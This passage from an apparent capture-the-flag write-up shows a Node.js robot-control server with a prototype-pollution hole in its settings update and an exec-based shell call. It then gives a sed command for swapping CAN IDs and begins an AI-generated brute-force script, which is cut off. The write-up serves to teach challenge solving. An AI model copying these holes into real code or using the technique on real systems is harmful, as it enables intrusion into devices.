</span><span id="__span-10-140"><a id="__codelineno-10-140" name="__codelineno-10-140"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"light_sensor"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0.5</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s2">"Bright"</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s2">"Dim"</span><span class="w"> </span><span class="p">},</span>
</span><span id="__span-10-141"><a id="__codelineno-10-141" name="__codelineno-10-141"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-142"><a id="__codelineno-10-142" name="__codelineno-10-142"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"gnome_config_object"</span><span class="p">,</span>
</span><span id="__span-10-143"><a id="__codelineno-10-143" name="__codelineno-10-143"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">gnomeBotObjectDetails</span><span class="p">),</span>
</span><span id="__span-10-144"><a id="__codelineno-10-144" name="__codelineno-10-144"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-10-145"><a id="__codelineno-10-145" name="__codelineno-10-145"></a><span class="p">];</span>
</span><span id="__span-10-146"><a id="__codelineno-10-146" name="__codelineno-10-146"></a>
</span><span id="__span-10-147"><a id="__codelineno-10-147" name="__codelineno-10-147"></a><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span>
</span><span id="__span-10-148"><a id="__codelineno-10-148" name="__codelineno-10-148"></a><span class="w">    </span><span class="s2">"Cache-Control"</span><span class="p">,</span>
</span><span id="__span-10-149"><a id="__codelineno-10-149" name="__codelineno-10-149"></a><span class="w">    </span><span class="s2">"no-store, no-cache, must-revalidate, proxy-revalidate"</span>
</span><span id="__span-10-150"><a id="__codelineno-10-150" name="__codelineno-10-150"></a><span class="p">);</span>
</span><span id="__span-10-151"><a id="__codelineno-10-151" name="__codelineno-10-151"></a><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"Pragma"</span><span class="p">,</span><span class="w"> </span><span class="s2">"no-cache"</span><span class="p">);</span>
</span><span id="__span-10-152"><a id="__codelineno-10-152" name="__codelineno-10-152"></a><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"Expires"</span><span class="p">,</span><span class="w"> </span><span class="s2">"0"</span><span class="p">);</span>
</span><span id="__span-10-153"><a id="__codelineno-10-153" name="__codelineno-10-153"></a>
</span><span id="__span-10-154"><a id="__codelineno-10-154" name="__codelineno-10-154"></a><span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s2">"stats"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">gnomeStats</span><span class="w"> </span><span class="p">});</span>
</span><span id="__span-10-155"><a id="__codelineno-10-155" name="__codelineno-10-155"></a><span class="p">});</span>
</span><span id="__span-10-156"><a id="__codelineno-10-156" name="__codelineno-10-156"></a>
</span><span id="__span-10-157"><a id="__codelineno-10-157" name="__codelineno-10-157"></a><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/ctrlsignals"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-158"><a id="__codelineno-10-158" name="__codelineno-10-158"></a><span class="kd">const</span><span class="w"> </span><span class="nx">requestPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">message</span><span class="p">));</span>
</span><span id="__span-10-159"><a id="__codelineno-10-159" name="__codelineno-10-159"></a>
</span><span id="__span-10-160"><a id="__codelineno-10-160" name="__codelineno-10-160"></a><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span>
</span><span id="__span-10-161"><a id="__codelineno-10-161" name="__codelineno-10-161"></a><span class="w">    </span><span class="s2">"Cache-Control"</span><span class="p">,</span>
</span><span id="__span-10-162"><a id="__codelineno-10-162" name="__codelineno-10-162"></a><span class="w">    </span><span class="s2">"no-store, no-cache, must-revalidate, proxy-revalidate"</span>
</span><span id="__span-10-163"><a id="__codelineno-10-163" name="__codelineno-10-163"></a><span class="p">);</span>
</span><span id="__span-10-164"><a id="__codelineno-10-164" name="__codelineno-10-164"></a><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"Pragma"</span><span class="p">,</span><span class="w"> </span><span class="s2">"no-cache"</span><span class="p">);</span>
</span><span id="__span-10-165"><a id="__codelineno-10-165" name="__codelineno-10-165"></a><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"Expires"</span><span class="p">,</span><span class="w"> </span><span class="s2">"0"</span><span class="p">);</span>
</span><span id="__span-10-166"><a id="__codelineno-10-166" name="__codelineno-10-166"></a>
</span><span id="__span-10-167"><a id="__codelineno-10-167" name="__codelineno-10-167"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">requestPayload</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">requestPayload</span><span class="p">.</span><span class="nx">action</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-168"><a id="__codelineno-10-168" name="__codelineno-10-168"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">"Invalid request payload"</span><span class="p">);</span>
</span><span id="__span-10-169"><a id="__codelineno-10-169" name="__codelineno-10-169"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">"Invalid request payload"</span><span class="p">);</span>
</span><span id="__span-10-170"><a id="__codelineno-10-170" name="__codelineno-10-170"></a><span class="w">    </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-10-171"><a id="__codelineno-10-171" name="__codelineno-10-171"></a><span class="p">}</span>
</span><span id="__span-10-172"><a id="__codelineno-10-172" name="__codelineno-10-172"></a>
</span><span id="__span-10-173"><a id="__codelineno-10-173" name="__codelineno-10-173"></a><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">requestPayload</span><span class="p">.</span><span class="nx">action</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-174"><a id="__codelineno-10-174" name="__codelineno-10-174"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s2">"move"</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-175"><a id="__codelineno-10-175" name="__codelineno-10-175"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Moving in direction: </span><span class="si">${</span><span class="nx">requestPayload</span><span class="p">.</span><span class="nx">direction</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span><span id="__span-10-176"><a id="__codelineno-10-176" name="__codelineno-10-176"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span><span class="w"> </span><span class="s2">"application/json"</span><span class="p">);</span>
</span><span id="__span-10-177"><a id="__codelineno-10-177" name="__codelineno-10-177"></a>
</span><span id="__span-10-178"><a id="__codelineno-10-178" name="__codelineno-10-178"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">requestPayload</span><span class="p">.</span><span class="nx">direction</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-179"><a id="__codelineno-10-179" name="__codelineno-10-179"></a><span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span>
</span><span id="__span-10-180"><a id="__codelineno-10-180" name="__codelineno-10-180"></a><span class="w">        </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span><span id="__span-10-181"><a id="__codelineno-10-181" name="__codelineno-10-181"></a><span class="w">            </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"message"</span><span class="p">,</span>
</span><span id="__span-10-182"><a id="__codelineno-10-182" name="__codelineno-10-182"></a><span class="w">            </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="s2">"error"</span><span class="p">,</span>
</span><span id="__span-10-183"><a id="__codelineno-10-183" name="__codelineno-10-183"></a><span class="w">            </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="s2">"No direction specified"</span><span class="p">,</span>
</span><span id="__span-10-184"><a id="__codelineno-10-184" name="__codelineno-10-184"></a><span class="w">        </span><span class="p">})</span>
</span><span id="__span-10-185"><a id="__codelineno-10-185" name="__codelineno-10-185"></a><span class="w">        </span><span class="p">);</span>
</span><span id="__span-10-186"><a id="__codelineno-10-186" name="__codelineno-10-186"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-10-187"><a id="__codelineno-10-187" name="__codelineno-10-187"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-10-188"><a id="__codelineno-10-188" name="__codelineno-10-188"></a>
</span><span id="__span-10-189"><a id="__codelineno-10-189" name="__codelineno-10-189"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">direction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">requestPayload</span><span class="p">.</span><span class="nx">direction</span><span class="p">;</span>
</span><span id="__span-10-190"><a id="__codelineno-10-190" name="__codelineno-10-190"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`/usr/bin/python3 /app/canbus_client.py "</span><span class="si">${</span><span class="nx">direction</span><span class="si">}</span><span class="sb">"`</span><span class="p">;</span>
</span><span id="__span-10-191"><a id="__codelineno-10-191" name="__codelineno-10-191"></a>
</span><span id="__span-10-192"><a id="__codelineno-10-192" name="__codelineno-10-192"></a><span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">direction</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-193"><a id="__codelineno-10-193" name="__codelineno-10-193"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s2">"left"</span><span class="o">:</span>
</span><span id="__span-10-194"><a id="__codelineno-10-194" name="__codelineno-10-194"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s2">"right"</span><span class="o">:</span>
</span><span id="__span-10-195"><a id="__codelineno-10-195" name="__codelineno-10-195"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s2">"up"</span><span class="o">:</span>
</span><span id="__span-10-196"><a id="__codelineno-10-196" name="__codelineno-10-196"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s2">"down"</span><span class="o">:</span>
</span><span id="__span-10-197"><a id="__codelineno-10-197" name="__codelineno-10-197"></a><span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Executing command: </span><span class="si">${</span><span class="nx">command</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span><span id="__span-10-198"><a id="__codelineno-10-198" name="__codelineno-10-198"></a><span class="w">        </span><span class="nx">exec</span><span class="p">(</span><span class="nx">command</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">,</span><span class="w"> </span><span class="nx">stdout</span><span class="p">,</span><span class="w"> </span><span class="nx">stderr</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-199"><a id="__codelineno-10-199" name="__codelineno-10-199"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-200"><a id="__codelineno-10-200" name="__codelineno-10-200"></a><span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="sb">`Error executing command: </span><span class="si">${</span><span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span><span id="__span-10-201"><a id="__codelineno-10-201" name="__codelineno-10-201"></a><span class="w">            </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-10-202"><a id="__codelineno-10-202" name="__codelineno-10-202"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-10-203"><a id="__codelineno-10-203" name="__codelineno-10-203"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">stderr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-204"><a id="__codelineno-10-204" name="__codelineno-10-204"></a><span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="sb">`Command stderr: </span><span class="si">${</span><span class="nx">stderr</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span><span id="__span-10-205"><a id="__codelineno-10-205" name="__codelineno-10-205"></a><span class="w">            </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-10-206"><a id="__codelineno-10-206" name="__codelineno-10-206"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-10-207"><a id="__codelineno-10-207" name="__codelineno-10-207"></a><span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Command stdout: </span><span class="si">${</span><span class="nx">stdout</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span><span id="__span-10-208"><a id="__codelineno-10-208" name="__codelineno-10-208"></a><span class="w">        </span><span class="p">});</span>
</span><span id="__span-10-209"><a id="__codelineno-10-209" name="__codelineno-10-209"></a>
</span><span id="__span-10-210"><a id="__codelineno-10-210" name="__codelineno-10-210"></a><span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span>
</span><span id="__span-10-211"><a id="__codelineno-10-211" name="__codelineno-10-211"></a><span class="w">            </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span><span id="__span-10-212"><a id="__codelineno-10-212" name="__codelineno-10-212"></a><span class="w">            </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"message"</span><span class="p">,</span>
</span><span id="__span-10-213"><a id="__codelineno-10-213" name="__codelineno-10-213"></a><span class="w">            </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="s2">"success"</span><span class="p">,</span>
</span><span id="__span-10-214"><a id="__codelineno-10-214" name="__codelineno-10-214"></a><span class="w">            </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="sb">`Moving </span><span class="si">${</span><span class="nx">direction</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span>
</span><span id="__span-10-215"><a id="__codelineno-10-215" name="__codelineno-10-215"></a><span class="w">            </span><span class="p">})</span>
</span><span id="__span-10-216"><a id="__codelineno-10-216" name="__codelineno-10-216"></a><span class="w">        </span><span class="p">);</span>
</span><span id="__span-10-217"><a id="__codelineno-10-217" name="__codelineno-10-217"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-10-218"><a id="__codelineno-10-218" name="__codelineno-10-218"></a>
</span><span id="__span-10-219"><a id="__codelineno-10-219" name="__codelineno-10-219"></a><span class="w">        </span><span class="k">default</span><span class="o">:</span>
</span><span id="__span-10-220"><a id="__codelineno-10-220" name="__codelineno-10-220"></a><span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">"Unknown direction"</span><span class="p">);</span>
</span><span id="__span-10-221"><a id="__codelineno-10-221" name="__codelineno-10-221"></a><span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span>
</span><span id="__span-10-222"><a id="__codelineno-10-222" name="__codelineno-10-222"></a><span class="w">            </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span><span id="__span-10-223"><a id="__codelineno-10-223" name="__codelineno-10-223"></a><span class="w">            </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"message"</span><span class="p">,</span>
</span><span id="__span-10-224"><a id="__codelineno-10-224" name="__codelineno-10-224"></a><span class="w">            </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="s2">"error"</span><span class="p">,</span>
</span><span id="__span-10-225"><a id="__codelineno-10-225" name="__codelineno-10-225"></a><span class="w">            </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="s2">"Unknown direction"</span><span class="p">,</span>
</span><span id="__span-10-226"><a id="__codelineno-10-226" name="__codelineno-10-226"></a><span class="w">            </span><span class="p">})</span>
</span><span id="__span-10-227"><a id="__codelineno-10-227" name="__codelineno-10-227"></a><span class="w">        </span><span class="p">);</span>
</span><span id="__span-10-228"><a id="__codelineno-10-228" name="__codelineno-10-228"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-10-229"><a id="__codelineno-10-229" name="__codelineno-10-229"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-10-230"><a id="__codelineno-10-230" name="__codelineno-10-230"></a>
</span><span id="__span-10-231"><a id="__codelineno-10-231" name="__codelineno-10-231"></a><span class="w">    </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-10-232"><a id="__codelineno-10-232" name="__codelineno-10-232"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-10-233"><a id="__codelineno-10-233" name="__codelineno-10-233"></a>
</span><span id="__span-10-234"><a id="__codelineno-10-234" name="__codelineno-10-234"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s2">"update"</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-235"><a id="__codelineno-10-235" name="__codelineno-10-235"></a><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-236"><a id="__codelineno-10-236" name="__codelineno-10-236"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">subkey</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">requestPayload</span><span class="p">;</span>
</span><span id="__span-10-237"><a id="__codelineno-10-237" name="__codelineno-10-237"></a><span class="w">        </span><span class="nx">gnomeBotObjectDetails</span><span class="p">[</span><span class="nx">key</span><span class="p">][</span><span class="nx">subkey</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
</span><span id="__span-10-238"><a id="__codelineno-10-238" name="__codelineno-10-238"></a>
</span><span id="__span-10-239"><a id="__codelineno-10-239" name="__codelineno-10-239"></a><span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span><span class="w"> </span><span class="s2">"application/json"</span><span class="p">);</span>
</span><span id="__span-10-240"><a id="__codelineno-10-240" name="__codelineno-10-240"></a><span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span>
</span><span id="__span-10-241"><a id="__codelineno-10-241" name="__codelineno-10-241"></a><span class="w">        </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span><span id="__span-10-242"><a id="__codelineno-10-242" name="__codelineno-10-242"></a><span class="w">            </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"message"</span><span class="p">,</span>
</span><span id="__span-10-243"><a id="__codelineno-10-243" name="__codelineno-10-243"></a><span class="w">            </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="s2">"success"</span><span class="p">,</span>
</span><span id="__span-10-244"><a id="__codelineno-10-244" name="__codelineno-10-244"></a><span class="w">            </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="sb">`Updated </span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nx">subkey</span><span class="si">}</span><span class="sb"> to </span><span class="si">${</span><span class="nx">value</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span>
</span><span id="__span-10-245"><a id="__codelineno-10-245" name="__codelineno-10-245"></a><span class="w">        </span><span class="p">})</span>
</span><span id="__span-10-246"><a id="__codelineno-10-246" name="__codelineno-10-246"></a><span class="w">        </span><span class="p">);</span>
</span><span id="__span-10-247"><a id="__codelineno-10-247" name="__codelineno-10-247"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-248"><a id="__codelineno-10-248" name="__codelineno-10-248"></a><span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span><span class="w"> </span><span class="s2">"application/json"</span><span class="p">);</span>
</span><span id="__span-10-249"><a id="__codelineno-10-249" name="__codelineno-10-249"></a><span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span>
</span><span id="__span-10-250"><a id="__codelineno-10-250" name="__codelineno-10-250"></a><span class="w">        </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span><span id="__span-10-251"><a id="__codelineno-10-251" name="__codelineno-10-251"></a><span class="w">            </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"message"</span><span class="p">,</span>
</span><span id="__span-10-252"><a id="__codelineno-10-252" name="__codelineno-10-252"></a><span class="w">            </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="s2">"error"</span><span class="p">,</span>
</span><span id="__span-10-253"><a id="__codelineno-10-253" name="__codelineno-10-253"></a><span class="w">            </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="sb">`Error updating settings: </span><span class="si">${</span><span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span>
</span><span id="__span-10-254"><a id="__codelineno-10-254" name="__codelineno-10-254"></a><span class="w">        </span><span class="p">})</span>
</span><span id="__span-10-255"><a id="__codelineno-10-255" name="__codelineno-10-255"></a><span class="w">        </span><span class="p">);</span>
</span><span id="__span-10-256"><a id="__codelineno-10-256" name="__codelineno-10-256"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-10-257"><a id="__codelineno-10-257" name="__codelineno-10-257"></a><span class="w">    </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-10-258"><a id="__codelineno-10-258" name="__codelineno-10-258"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-10-259"><a id="__codelineno-10-259" name="__codelineno-10-259"></a>
</span><span id="__span-10-260"><a id="__codelineno-10-260" name="__codelineno-10-260"></a><span class="w">    </span><span class="k">default</span><span class="o">:</span>
</span><span id="__span-10-261"><a id="__codelineno-10-261" name="__codelineno-10-261"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">"Unknown action"</span><span class="p">);</span>
</span><span id="__span-10-262"><a id="__codelineno-10-262" name="__codelineno-10-262"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">"Unknown action"</span><span class="p">);</span>
</span><span id="__span-10-263"><a id="__codelineno-10-263" name="__codelineno-10-263"></a><span class="w">    </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-10-264"><a id="__codelineno-10-264" name="__codelineno-10-264"></a><span class="p">}</span>
</span><span id="__span-10-265"><a id="__codelineno-10-265" name="__codelineno-10-265"></a><span class="p">});</span>
</span><span id="__span-10-266"><a id="__codelineno-10-266" name="__codelineno-10-266"></a>
</span><span id="__span-10-267"><a id="__codelineno-10-267" name="__codelineno-10-267"></a><span class="c1">// Health check</span>
</span><span id="__span-10-268"><a id="__codelineno-10-268" name="__codelineno-10-268"></a><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/healthz"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-269"><a id="__codelineno-10-269" name="__codelineno-10-269"></a><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">"OK"</span><span class="p">);</span>
</span><span id="__span-10-270"><a id="__codelineno-10-270" name="__codelineno-10-270"></a><span class="p">});</span>
</span><span id="__span-10-271"><a id="__codelineno-10-271" name="__codelineno-10-271"></a>
</span><span id="__span-10-272"><a id="__codelineno-10-272" name="__codelineno-10-272"></a><span class="c1">// --- Server Setup ---</span>
</span><span id="__span-10-273"><a id="__codelineno-10-273" name="__codelineno-10-273"></a><span class="kd">const</span><span class="w"> </span><span class="nx">PORT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="mf">3000</span><span class="p">;</span>
</span><span id="__span-10-274"><a id="__codelineno-10-274" name="__codelineno-10-274"></a>
</span><span id="__span-10-275"><a id="__codelineno-10-275" name="__codelineno-10-275"></a><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-276"><a id="__codelineno-10-276" name="__codelineno-10-276"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server (HTTP only) running on port </span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span><span id="__span-10-277"><a id="__codelineno-10-277" name="__codelineno-10-277"></a><span class="p">});</span>
</span></code></pre></div></td></tr></tbody></table></div>
</details>
<p>One way to find the correct CAN IDs to move the robot is by brute forcing all options. We can replace the IDs in <code>canbus_client.py</code> using <code>sed</code>:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>sed -i \"s/0x656/0x700/g\" canbus_client_test.py
</span></code></pre></div>
<p>We generate a Python script that replaces the CAN ID of one of the movement actions using prototype pollution and attempts to move the robot to see if it returns success. It makes sure to copy the original version of the script first to limit breaking the webapp and make replacing the correct value easier.</p>
<div class="admonition example">
<p class="admonition-title">AI usage</p>
<p>Gemini Pro 3 was used to generate this script.</p>
</div>
<details class="note">
<summary>Python brute force script</summary>
<div class="language-py highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-12-10">10</a></span>
<span class="normal"><a href="#__codelineno-12-11">11</a></span>
<span class="normal"><a href="#__codelineno-12-12">12</a></span>
<span class="normal"><a href="#__codelineno-12-13">13</a></span>
<span class="normal"><a href="#__codelineno-12-14">14</a></span>
<span class="normal"><a href="#__codelineno-12-15">15</a></span>
<span class="normal"><a href="#__codelineno-12-16">16</a></span>
<span class="normal"><a href="#__codelineno-12-17">17</a></span>
<span class="normal"><a href="#__codelineno-12-18">18</a></span>
<span class="normal"><a href="#__codelineno-12-19">19</a></span>
<span class="normal"><a href="#__codelineno-12-20">20</a></span>
<span class="normal"><a href="#__codelineno-12-21">21</a></span>
<span class="normal"><a href="#__codelineno-12-22">22</a></span>
<span class="normal"><a href="#__codelineno-12-23">23</a></span>
<span class="normal"><a href="#__codelineno-12-24">24</a></span>
<span class="normal"><a href="#__codelineno-12-25">25</a></span>
<span class="normal"><a href="#__codelineno-12-26">26</a></span>
<span class="normal"><a href="#__codelineno-12-27">27</a></span>
<span class="normal"><a href="#__codelineno-12-28">28</a></span>
<span class="normal"><a href="#__codelineno-12-29">29</a></span>
<span class="normal"><a href="#__codelineno-12-30">30</a></span>
<span class="normal"><a href="#__codelineno-12-31">31</a></span>
